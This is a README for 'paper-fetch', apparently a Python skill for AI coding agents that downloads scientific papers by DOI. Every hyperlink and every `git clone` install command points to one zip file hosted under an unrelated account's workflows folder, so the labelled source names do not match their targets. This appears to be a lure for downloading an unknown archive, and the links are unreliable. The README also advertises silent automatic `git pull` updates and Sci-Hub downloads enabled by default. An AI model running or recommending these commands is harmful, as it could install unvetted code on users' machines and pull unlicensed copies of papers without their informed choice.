# paper-fetch — Download Scientific papers automatically

[中文文档](README_CN.md)

## What it does

- Downloads paper PDFs from a **DOI** (or batch file of DOIs) via open-access sources
- **6-source fallback chain**: [Unpaywall](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) → [Semantic Scholar](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) `openAccessPdf` → [arXiv](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) → [PubMed Central OA](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) → [bioRxiv](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip)/[medRxiv](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) → [Sci-Hub](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip) mirrors (last resort, on by default)
- **Zero dependencies** — pure Python standard library, no `pip install` needed
- **Auto-named output** — `{first_author}_{year}_{journal_abbrev}_{short_title}.pdf` (journal omitted if unknown; multi-word journals get ISO-style initials, e.g. *Proceedings of the National Academy of Sciences* → `PNAS`)
- **Batch mode** — pass a file of DOIs with `--batch`, or pipe them in with `--batch -`
- **Agent-native** — stable JSON envelope on stdout, NDJSON progress on stderr, machine-readable `schema` subcommand (with `deprecations` slot for forward-compat drift detection), TTY-aware format default, idempotent retries via `--idempotency-key`, typed exit codes (`0`/`1`/`3`/`4`), partial-success batches with `next` retry hints, per-source diagnostics in `result.source_detail` (e.g. which Sci-Hub mirror won, so an orchestrator can pin it via `PAPER_FETCH_SCIHUB_MIRRORS`)
- **Safely retriable** — re-running skips already-downloaded files; `--idempotency-key` replays the exact envelope without any network I/O
- **Self-updating** — when installed via `git clone`, the agent runs a synchronous `git pull --ff-only` on the first invocation per conversation, throttled to once per 24h via `<skill_dir>/.last_update`. Updates apply immediately. Zero user action required. Force an immediate check with `rm <skill_dir>/.last_update`.

## Discipline Coverage

**The skill is discipline-agnostic** — it works for any field, not just life sciences or computer science.

| Source | Discipline scope |
|---|---|
| **Unpaywall** | ✅ All disciplines (covers every Crossref DOI — humanities, social sciences, physics, chemistry, economics, etc.) |
| **Semantic Scholar** | ✅ All disciplines (cross-domain academic graph) |
| **arXiv** | Physics, math, CS, statistics, quantitative finance, economics, EE |
| **PubMed Central** | Biomedical only |
| **bioRxiv / medRxiv** | Biology / medicine preprints only |
| **Sci-Hub mirrors** | ✅ All disciplines (last-resort fallback when every OA / institutional source misses) |

In practice, **Unpaywall + Semantic Scholar alone cover OA papers in chemistry, materials, economics, psychology, humanities, and every other field** via institutional repositories, SSRN, RePEc, and publisher-hosted OA copies. arXiv/PMC/bioRxiv are additional fallbacks for their specific domains, and Sci-Hub is the universal last resort.

## Multi-Platform Support

Works with all major AI coding agents that support the Agent Skills format:

| Platform | Status | Details |
|----------|--------|---------|
| **Claude Code** | ✅ Full support | Native SKILL.md format |
| **OpenClaw / ClawHub** | ✅ Full support | `metadata.openclaw` namespace |
| **Hermes Agent** | ✅ Full support | Installable under research category |
| **[pi-mono](https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip)** | ✅ Full support | `metadata.pimo` namespace |
| **OpenAI Codex** | ✅ Full support | `agents/openai.yaml` sidecar |
| **SkillsMP** | ✅ Indexed | GitHub topics configured |

## Comparison

### vs No Skill (native agent)

| Feature | Native agent | This skill |
|---------|-------------|------------|
| Resolve DOI to PDF | Ad-hoc web search | Deterministic 5-source chain |
| Unpaywall integration | No | Yes — highest OA coverage |
| arXiv / PMC / bioRxiv fallback | Manual | Automatic |
| Batch download | No | Yes — `--batch dois.txt` or `--batch -` (stdin) |
| Consistent filenames | No | Yes — `author_year_title.pdf` |
| Machine-readable schema | No | Yes — `fetch.py schema` |
| Structured output | No | Stable JSON envelope + NDJSON progress |
| Idempotent retries | No | `--idempotency-key` replays cached envelope |
| Typed exit codes | No | `0`/`1`/`3`/`4` — orchestrator can route failures |
| Dependencies | Varies | Python stdlib only |

## Prerequisites

- **Python 3.8+** (standard library only, no extra packages)
- **Unpaywall contact email** (optional but recommended) — set once:

```bash
export UNPAYWALL_EMAIL=you@example.com
```

Add it to `~/.zshrc` / `~/.bashrc` to persist. Without it, Unpaywall is skipped and the remaining 4 sources (Semantic Scholar, arXiv, PMC, bioRxiv/medRxiv) are still tried.

## Skill Installation

### Claude Code

```bash
# Global install
git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.claude/skills/paper-fetch

# Project-level install
git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip .claude/skills/paper-fetch
```

### OpenClaw / ClawHub

```bash
clawhub install paper-fetch

# Or manual
git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.openclaw/skills/paper-fetch
```

### Hermes Agent

```bash
git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.hermes/skills/research/paper-fetch
```

Or add to `~/.hermes/config.yaml`:

```yaml
skills:
  external_dirs:
    - ~/myskills/paper-fetch
```

### pi-mono

```bash
git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.pimo/skills/paper-fetch
```

### OpenAI Codex

```bash
# User-level
git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip ~/.agents/skills/paper-fetch

# Project-level
git clone https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip .agents/skills/paper-fetch
```

### SkillsMP

```bash
skills install paper-fetch
```

### Installation paths summary

| Platform | Global path | Project path |
|----------|-------------|--------------|
| Claude Code | `~/.claude/skills/paper-fetch/` | `.claude/skills/paper-fetch/` |
| OpenClaw | `~/.openclaw/skills/paper-fetch/` | `skills/paper-fetch/` |
| Hermes Agent | `~/.hermes/skills/research/paper-fetch/` | Via `external_dirs` |
| pi-mono | `~/.pimo/skills/paper-fetch/` | — |
| OpenAI Codex | `~/.agents/skills/paper-fetch/` | `.agents/skills/paper-fetch/` |
| SkillsMP | N/A (installed via CLI) | N/A |

## Usage

Single DOI:

```bash
python scripts/fetch.py 10.1038/s41586-021-03819-2
```

Custom output directory:

```bash
python scripts/fetch.py 10.1038/s41586-021-03819-2 --out ~/papers
```

Batch mode:

```bash
cat > dois.txt <<EOF
10.1038/s41586-021-03819-2
10.1126/science.abj8754
10.1101/2023.01.01.522400
EOF

python scripts/fetch.py --batch dois.txt --out ~/papers
```

Dry-run (preview without downloading):

```bash
python scripts/fetch.py 10.1038/s41586-020-2649-2 --dry-run
```

Human-readable text output:

```bash
python scripts/fetch.py 10.1038/s41586-020-2649-2 --format text
```

Pipe DOIs from another tool:

```bash
echo 10.1038/s41586-021-03819-2 | python scripts/fetch.py --batch -
```

Safely retriable batch (replay cached envelope on retry):

```bash
python scripts/fetch.py --batch dois.txt --out ~/papers \
    --idempotency-key monday-review-batch
```

Machine-readable self-description (for agents):

```bash
python scripts/fetch.py schema --pretty
```

Streaming NDJSON (one result per line as each DOI resolves):

```bash
python scripts/fetch.py --batch dois.txt --stream
```

Or just ask your agent naturally:

> Download the AlphaFold2 paper PDF to my `~/papers` folder

> Fetch the PDF for DOI 10.1038/s41586-020-2649-2

> Download these three papers: 10.1038/s41586-021-03819-2, 10.1126/science.abj8754, 10.1101/2023.01.01.522400

> Check if this paper has an open-access PDF available: 10.1038/s41586-020-2649-2

> Batch download all DOIs from my dois.txt file into ~/papers

## Resolution Order

1. **Unpaywall** — best OA location across all publishers (highest hit rate)
2. **Semantic Scholar** — `openAccessPdf` field + `externalIds` lookup
3. **arXiv** — if the paper has an arXiv ID
4. **PubMed Central OA subset** — if the paper has a PMCID
5. **bioRxiv / medRxiv** — DOI prefix `10.1101/`
6. **Publisher direct** — institutional mode only (`PAPER_FETCH_INSTITUTIONAL=1`); your subscription IP / cookies / EZproxy authorize the fetch
7. **Sci-Hub mirrors** — last resort, on by default. Tries `PAPER_FETCH_SCIHUB_MIRRORS` (or built-in defaults: `sci-hub.ru`, `sci-hub.st`, `sci-hub.su`, `sci-hub.box`, `sci-hub.red`, `sci-hub.al`, `sci-hub.mk`, `sci-hub.ee`); on full miss, scrapes `https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip` once for fresh mirrors. Disable with `PAPER_FETCH_NO_SCIHUB=1`.
8. Otherwise → report failure with metadata (title/authors) for ILL

## Files

- `SKILL.md` — **the only required file**. Loaded by all platforms.
- `scripts/fetch.py` — the downloader (pure stdlib Python)
- `agents/openai.yaml` — OpenAI Codex sidecar configuration
- `README.md` — this file
- `README_CN.md` — Chinese documentation

## Known Limitations

- **Some publisher redirects** return an HTML landing page instead of a PDF; the script validates the `%PDF` header and fails cleanly in that case
- **No authentication** — institutional proxies (EZproxy / OpenAthens) are not supported in this version
- **SSRF defense** — every outbound fetch rejects private IPs, non-http(s) schemes, non-80/443 ports, and cloud-metadata hostnames
- **50 MB size limit** — per-PDF download cap to prevent runaway downloads

## License

MIT

## Support

If this skill helps you, consider supporting the author:

<table>
  <tr>
    <td align="center">
      <img src="https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip" width="180" alt="WeChat Pay">
      <br>
      <b>WeChat Pay</b>
    </td>
    <td align="center">
      <img src="https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip" width="180" alt="Alipay">
      <br>
      <b>Alipay</b>
    </td>
    <td align="center">
      <img src="https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip" width="180" alt="Buy Me a Coffee">
      <br>
      <b>Buy Me a Coffee</b>
    </td>
    <td align="center">
      <img src="https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip" width="180" alt="Give a Reward">
      <br>
      <b>Give a Reward</b>
    </td>
  </tr>
</table>

## Author

**Agents365-ai**

- Bilibili: https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip
- GitHub: https://raw.githubusercontent.com/Kara-lynnmacroeconomic2412/paper-fetch/main/.github/workflows/fetch_paper_1.8.zip
